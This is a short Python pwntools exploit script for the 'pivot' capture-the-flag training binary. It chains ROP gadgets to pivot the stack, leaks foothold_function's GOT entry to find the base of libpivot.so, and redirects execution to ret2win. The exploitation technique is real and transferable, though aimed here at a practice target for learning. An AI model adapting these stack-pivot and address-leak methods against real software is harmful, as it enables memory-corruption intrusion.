#!/usr/bin/env python

from pwn import *
import re

p = process("./pivot")

data = p.recvuntil("> ")

res = re.findall(r": ([a-z0-9]+)\n", data)
rop_addr = int(res[0], 16)

rop = (
    p64(0x400850) + #  foothold_function@plt
    p64(0x400b73) + # pop rdi ; ret
    p64(0x602048) + # foothold_function@got.plt
    p64(0x400800) + # puts@plt
    p64(0x400996) + # main 
    p64(0x400996) # main 
)

p.sendline(rop)

p.recvuntil("> ")

trigger = (
    "\x90" * 40 +
    p64(0x400b00) + # pop rax ; ret
    p64(rop_addr) +
    p64(0x400b02) # xchg rsp,rax ; ret
)

p.sendline(trigger)
p.recvuntil("libpivot.so")
data = p.recv(1024)[:6].ljust(8, "\x00")

leak = u64(data[:8])
print("Leak", hex(leak))

base = leak - 0x970
print("Base", hex(base))

ret2win = base + 0xabe
print("Ret2Win", hex(ret2win))

p.sendline("D")
p.recvuntil("> ")
p.sendline("D")
p.recvuntil("> ")

payload = (
    "\x90" * 40 +
    p64(ret2win)
)
p.sendline(payload)
print(p.recvall())

p.close()
